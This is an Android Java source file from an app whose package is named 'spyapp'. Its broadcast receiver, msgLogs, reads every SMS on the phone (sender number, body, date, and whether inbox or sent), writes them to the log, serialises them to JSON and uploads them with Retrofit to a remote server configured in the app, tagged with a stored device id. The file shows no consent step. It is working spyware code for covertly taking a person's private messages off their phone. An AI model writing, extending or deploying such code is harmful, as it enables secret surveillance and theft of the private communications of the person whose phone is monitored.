package kkactive_india.in.spyapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

import com.google.gson.Gson;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import kkactive_india.in.spyapp.msgPOJO.MsgBean;
import kkactive_india.in.spyapp.msgPOJO.MsgDatum;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.converter.scalars.ScalarsConverterFactory;

public class msgLogs extends BroadcastReceiver {

    String address,body,date,type;
    Date dateFormat;
    List<MsgDatum> data = new ArrayList<>();
    SharedPreferences pref;
    SharedPreferences.Editor edit;
    @Override
    public void onReceive(Context context, Intent intent) {


        pref = context.getSharedPreferences("pref", Context.MODE_PRIVATE);
        edit = pref.edit();
        List<String> sms = new ArrayList<String>();
        Uri uriSMSURI = Uri.parse("content://sms");
        StringBuffer sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, strOrder);

        sb.append("SMS Details :");
        while (cur != null && cur.moveToNext()) {
            String name = cur.getString(cur.getColumnIndexOrThrow("_id"));
            address = cur.getString(cur.getColumnIndex("address"));
            body = cur.getString(cur.getColumnIndexOrThrow("body"));
            date = cur.getString(cur.getColumnIndexOrThrow("date"));
            dateFormat = new Date(Long.valueOf(date));
            type = null;
            switch (Integer.parseInt(cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                case Telephony.Sms.MESSAGE_TYPE_INBOX:
                    type = "inbox";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_SENT:
                    type = "sent";
                    break;
                /*case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                    type = "draft";
                    break;*/
                default:
                    break;
            }

            MsgDatum person = new MsgDatum();
            person.setMobile( address );
            person.setMessage( body );
            person.setDate( String.valueOf(dateFormat) );
            person.setType( type );
            data.add(person);
            sms.add("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);

            sb.append("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
            sb.append("\n-----------------");
        }
        Log.d("SMSS", sms.toString());
        //textView.setText(sb);

        if (cur != null) {
            cur.close();
        }
        //return sms;


        Bean b = (Bean) context.getApplicationContext();

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(b.baseURL)
                .addConverterFactory(ScalarsConverterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        Allapi cr = retrofit.create(Allapi.class);
        MsgBean body = new MsgBean();
        body.setMsgData(data);

        Gson gsonObj = new Gson();

        String jsonStr = gsonObj.toJson(body);
        String id = pref.getString("id","");
        Log.d("idHaiKyaBhai", id);
        Log.d("idHaiKyaBhai", pref.getString("id",""));
        Log.d("idHaikya", jsonStr);
        Call<MsgBean> call = cr.msgs(id,jsonStr);
        call.enqueue(new Callback<MsgBean>() {
            @Override
            public void onResponse(Call<MsgBean> call, Response<MsgBean> response) {
                Log.d("messageGaya?", "haanGaya");
            }

            @Override
            public void onFailure(Call<MsgBean> call, Throwable t) {
                Log.d("messageGaya?", "nahiGaya");

            }
        });


    }
}
